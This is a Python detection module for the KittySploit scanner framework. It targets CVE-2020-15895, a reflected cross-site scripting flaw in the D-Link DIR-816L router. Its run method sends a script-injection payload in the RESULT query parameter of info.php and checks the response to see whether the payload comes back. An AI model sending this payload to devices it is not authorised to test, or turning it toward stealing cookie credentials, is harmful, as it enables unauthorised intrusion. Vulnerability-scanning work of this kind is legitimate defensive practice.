#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-816L devices 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-816L 2.x - Cross-Site Scripting Detection',
        'description': 'D-Link DIR-816L devices 2.x before 1.10b04Beta02 contains a cross-site scripting vulnerability. In the file webinc/js/info.php, no output filtration is applied to the RESULT parameter before being printed on the webpage. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site, which can allow for theft of cookie-based authentication credentials and launch of other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'dlink', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://research.loginsoft.com/bugs/multiple-vulnerabilities-discovered-in-the-d-link-firmware-dir-816l/',
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10169',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-15895',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-15895',
    }

    def run(self):
        r = self.http_request(method="GET", path='/info.php?RESULT=",msgArray);alert(document.domain);//', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = (';alert(document.domain);', 'DIR-816L',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="D-Link DIR-816L 2.x - Cross-Site Scripting detected",
                path='/info.php?RESULT=",msgArray);alert(document.domain);//',
            )
            return True
        return False

